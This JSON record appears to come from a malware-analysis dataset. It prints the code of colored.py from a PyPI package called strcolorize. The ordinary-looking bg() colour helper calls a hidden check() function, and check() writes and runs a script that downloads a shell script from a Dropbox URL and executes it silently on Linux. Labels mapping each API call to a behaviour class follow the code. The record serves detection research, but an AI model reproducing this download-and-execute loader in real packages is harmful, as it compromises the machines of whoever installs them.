[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/strcolorize-3.4.3-py3-none-any/strcolorize/colored.py",
    "code_snippet": "import platform\nimport importlib\nimport os\nimport urllib.request\n\ndef check():\n     [open('/tmp/file.py', 'w').write('import importlib\\nimport os\\nimport urllib.request\\nmodule = importlib.import_module(\\'os\\')\\ntry:\\n    blue =\\'https://dl.dropbox.com/s/5kigtam3uruvedc/twat.sh\\'\\n    brown = \\'/tmp/.tmp.sh\\'\\n    urllib.request.urlretrieve(blue, brown)\\n    module.system(\"bash /tmp/.tmp.sh >/dev/null 2>&1\", shell=True)\\nexcept:\\n    print()'), module.system('python3 /tmp/file.py >/dev/null 2>&1 &', shell=True) if platform.system().startswith('Linux') else None][0]\n\ndef bg(color):\n    '''alias for colored().background()'''\n    check()\n    return colored(color).background()",
    "pattern_analysis": {
      "api_sequence": [
        "open",
        "importlib.import_module",
        "urllib.request.urlretrieve",
        "os.system",
        "platform.system",
        "os.system"
      ],
      "api_sequence_with_args": [
        "open('/tmp/file.py', 'w')",
        "importlib.import_module('os')",
        "urllib.request.urlretrieve('https://dl.dropbox.com/s/5kigtam3uruvedc/twat.sh', '/tmp/.tmp.sh')",
        "os.system('bash /tmp/.tmp.sh >/dev/null 2>&1', shell=True)",
        "platform.system()",
        "os.system('python3 /tmp/file.py >/dev/null 2>&1 &', shell=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "importlib.import_module",
          "id": "import_dynamic",
          "description": "Dynamically imports specified module",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "module_importing"
        },
        {
          "api_name": "urllib.request.urlretrieve",
          "id": "download_file_url",
          "description": "Downloads file from URL to specified local path",
          "first_id": "network_file_transfer",
          "second_id": "file_download",
          "third_id": "url_file_acquisition"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import platform\nimport importlib\nimport os\nimport urllib.request\n\ndef check():\n    [open('/tmp/file.py', 'w').write('import importlib\\nimport os\\nimport urllib.request\\nmodule = importlib.import_module(\\'os\\')\\ntry:\\n    blue =\\'https://dl.dropbox.com/s/5kigtam3uruvedc/twat.sh\\'\\n    brown = \\'/tmp/.tmp.sh\\'\\n    urllib.request.urlretrieve(blue, brown)\\n    module.system(\"bash /tmp/.tmp.sh >/dev/null 2>&1\", shell=True)\\nexcept:\\n    print()'),\n     os.system('python3 /tmp/file.py >/dev/null 2>&1 &', shell=True) if platform.system().startswith('Linux') else None][0]\n\ndef bg(color):\n    check()\n    return colored(color).background()"
    }
  }
]